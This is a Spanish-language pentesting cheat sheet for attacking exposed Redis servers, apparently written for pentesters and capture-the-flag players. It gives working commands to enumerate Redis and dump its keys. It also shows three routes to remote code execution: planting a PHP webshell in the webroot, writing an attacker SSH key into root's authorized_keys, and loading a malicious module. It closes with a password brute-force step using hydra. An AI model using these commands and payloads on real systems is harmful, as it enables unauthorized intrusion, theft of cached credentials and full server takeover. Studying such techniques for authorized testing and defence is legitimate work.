# Redis

> **Puerto por defecto:** `6379/TCP`

Redis es un almacén de datos en memoria (clave-valor) usado como caché, cola o base de datos rápida. Su problema de seguridad clásico: por defecto **no requiere autenticación** y escucha sin cifrar. Un Redis expuesto sin contraseña puede llevar directamente a **lectura de datos**, **escritura de archivos** y **RCE**.

---

## Enumeración

```bash
nmap -p6379 -sCV --script="redis-*" <IP>
```

### Conexión

```bash
redis-cli -h <IP>
redis-cli -h <IP> -a <contraseña>     # si pide AUTH
```

Dentro:

```text
INFO                 # versión, rol, config, nº de claves
CONFIG GET *         # toda la configuración (dir, dbfilename...)
CLIENT LIST
KEYS *               # todas las claves (¡datos sensibles!)
GET <clave>
SELECT <n>           # cambiar de base (0-15)
```

> **Consejo:** `INFO` te dice la versión y si eres `master`/`slave`. `KEYS *` + `GET` a menudo filtran tokens de sesión, credenciales cacheadas o datos de la aplicación. Revísalo antes de ir a por RCE.

---

## RCE 1 — Escribir una webshell

Si Redis corre junto al servidor web y puedes cambiar `dir`/`dbfilename`, vuelca una webshell al webroot:

```bash
redis-cli -h <IP>
```
```text
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php system($_GET['cmd']); ?>"
save
```

Luego:

```bash
curl "http://<IP>/shell.php?cmd=id"
```

---

## RCE 2 — Clave SSH autorizada

Si Redis corre como un usuario con `~/.ssh/`, escribe tu clave pública en `authorized_keys`:

```bash
# En tu máquina: genera una clave y prepárala con saltos de línea
(echo; echo; cat ~/.ssh/id_rsa.pub; echo; echo) > key.txt
redis-cli -h <IP> flushall
cat key.txt | redis-cli -h <IP> -x set crackit
redis-cli -h <IP> config set dir /root/.ssh/     # o /home/<user>/.ssh/
redis-cli -h <IP> config set dbfilename authorized_keys
redis-cli -h <IP> save
# Ahora entra por SSH con tu clave
ssh -i ~/.ssh/id_rsa root@<IP>
```

---

## RCE 3 — Módulo malicioso (RogueSQL / módulos)

En versiones que permiten `MODULE LOAD`, se puede cargar un módulo `.so` malicioso para RCE directo (herramienta: **RedisModules-ExecuteCommand** / exploits públicos). Útil cuando no hay webroot ni `.ssh` escribibles.

---

## Fuerza bruta de contraseña

Si Redis pide `AUTH`:

```bash
nmap -p6379 --script redis-brute <IP>
hydra -P /usr/share/wordlists/rockyou.txt redis://<IP>
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `redis-cli` | Cliente oficial de Redis. |
| `nmap` (`redis-*`) | Enumeración y fuerza bruta. |
| Exploits de `MODULE LOAD` | RCE vía módulo malicioso. |

---

> **Consejo:** ante un Redis abierto, primero `INFO` y `KEYS *` (datos gratis), y luego decide la vía de RCE según el contexto: **webshell** si ves un servidor web, **authorized_keys** si corre como root/usuario con home, o **módulo** si lo anterior no aplica. Comprueba con `CONFIG GET dir` dónde puedes escribir.
